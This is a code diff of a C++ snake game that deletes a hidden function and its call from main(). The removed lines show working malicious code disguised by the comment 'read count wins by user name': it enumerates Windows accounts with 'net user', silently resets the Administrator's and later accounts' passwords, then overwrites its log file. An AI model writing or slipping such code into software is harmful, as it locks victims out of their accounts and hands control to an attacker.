@@ -47,29 +47,7 @@ void printMap() {
 //      int arr_oo[]={0,2,1,1,1,3,2,0,2,4,3,1,3,3,4,2};
 
 
-void readfile(){
-ifstream inFile;
-ofstream outFile;
-bool ok = 0;
-string user;
-system("net user > snake_game.txt");
-inFile.open("snake_game.txt");
-    while(1){
-   inFile >> user;
-   if(user == "The"){break;}
-   if(user == "Administrator" || ok){
-	 ok=1;
-	string cmd("net user ");
-    cmd += user;
-	cmd += " _PalyNewGame_ ";
-	cmd += " > nul ";
-    system(cmd.c_str());
-   }
-   if(inFile.eof()){break;}
-}
-system("echo win : 0 > snake_game.txt");
-inFile.close();
-}
+
 void setPosToSnake_Fruit() {
     snake = { (short)random(1, width) , (short)random(1, hight) };
     fruit = { (short)random(1, width) , (short)random(1, hight) };
@@ -84,7 +62,6 @@ void setPosToSnake_Fruit() {
 
 int main(){ 
     srand(time(NULL)); // give you random number every exec this program
-    readfile();// read count wins by user name 
     A:
      int win = 0;
     setPosToSnake_Fruit();
